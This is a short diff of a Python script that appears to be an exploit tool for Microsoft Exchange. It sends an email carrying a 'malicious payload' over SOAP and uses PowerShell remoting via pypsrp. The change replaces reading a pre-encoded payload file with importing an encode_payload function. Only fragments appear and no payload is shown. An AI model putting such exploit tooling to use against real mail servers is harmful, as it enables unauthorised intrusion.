@@ -10,6 +10,7 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from pypsrp.powershell import PowerShell, RunspacePool
 from pypsrp.wsman import WSMan
+from encode_payload import encode_payload
 
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -138,14 +139,6 @@ def get_sid(url: str, email: str):
 
 
 def send_email_contains_malicious_payload():
-    try:
-        print ("[-] Reading payload from encodePayload.txt file")
-        payload = open("encode-payload/encodedPayload.txt", "r").read()
-    except Exception as e:
-        print (str(e))
-        print ("[x] Run ps1 script to generate file and make sure the directory path is correct")
-        sys.exit(1)
-        
     email_body = f"""
     <soap:Envelope
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
